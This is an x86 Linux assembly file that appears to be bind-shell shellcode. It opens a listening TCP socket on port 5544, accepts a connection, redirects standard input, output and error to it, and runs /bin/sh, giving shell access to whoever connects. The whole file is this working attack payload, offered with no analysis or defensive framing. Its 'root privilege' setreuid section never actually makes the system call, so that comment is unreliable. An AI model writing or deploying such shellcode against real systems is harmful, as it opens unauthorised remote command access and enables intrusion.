section .text

global _start 
_start :
		xor eax,eax          ;cleaning eax register
		xor ebx,ebx          ;cleaning ebx register
		xor edx,edx	     ;cleaning edx register
		xor ecx,ecx	     ;cleaning ecx register   	
        ;socketcall(int call,unsigned long *args)
	;eax(sock)=socket(AF_INET,SOCK_STREAM,0)
		mov al,0x66	    ;socket sys_call(102)
		mov bl,0x1          ;socket funcntion (1)
		push edx            ;IP_PROTO (0)
		push byte 0x1       ;SOCK_STREAM
		push byte 0x2       ;AF_INET
		mov ecx,esp         ;saving stack pointer to ecx
		int 0x80            ;kernel call	
		
		pop edi             ;0x2(bind sys_call-->last argument in stack)
		xchg edi,eax        ;saving socket descriptor --> edi
		
	;bind(sock,(struct sockaddr *)&server,sizeof(server))			
		xchg ebx,eax        ;0x2-->ebx(bind sys_call)
		mov al,0x66         ;socket sys_call
		push edx            ;INADDR_ANY
		push 0xA815         ;PortNo=5544
		push bx            ;AF_INET=Family
		mov ecx,esp
		push byte 16        ;sizeof(server)
		push ecx	    ;struct(sockaddr *)&server	
		push edi            ;sock descriptor		
		mov ecx,esp
		int 0x80            ;kernel call
	;listen(sock,0)
		xor edi,edi	    ;cleaning edi register	
		pop edx             ;save sock
		push edi            ;2 argument in listen
		push edx            ;pushing sock
		mov bl,0x4          ;listen sys_call
		mov ecx,esp         ;stack pointer-->ecx
		mov al,0x66	    ;socket sys_call
		int 0x80	    ;kernel call
	;accept(sock,sockaddr,sizeof(addr))
					 
		push edi            ;0-->3rd argument
		push edi 	    ;0-->2nd argument
		push edx            ;sock
	        mov ecx,esp	    ;stack pointer -->ecx
		mov bl,0x5          ;accept sys_call
		mov al,0x66         ;socket sys_call
		int 0x80	
	;dup2(socket_despcriptor,0,1,2) stdin,out,err
		xchg eax,ebx        ;client_sock =accept(,,)
		pop ecx    	    ;sock
	 loop:
	       mov al,0x3f          ;dup2 sys_call
	       int 0x80		    ;Kernel Call	
		dec ecx		    ;decrementing c from 2-->0		
	jns loop                    ;loop until eax>=0(Jump Not Signed>
			
		
		
	;setruid sys_call  for root previlege
		xor eax,eax         ;cleaning eax register
		mov al,70	    ;setruid sys_call	
		xor ebx,ebx	    ;1st argument	
		xor ecx,ecx	    ;2nd Argument	 	
		
		;execv sys_call
		xor eax,eax         ;cleaning eax register 
		push eax	    ;Pushing NULL	
		push 0x68732f6e       ;//bin/sh
		push 0x69622f2f
		mov ebx,esp	    ;1st argument	
		push eax	    	
		push ebx	    	
		mov ecx,esp	    ;2nd argument	
		push eax	   	
		mov edx,esp         ;3rd argument
		mov al,11	    ;execve sys_call	
		int 0x80	    ;kernel				
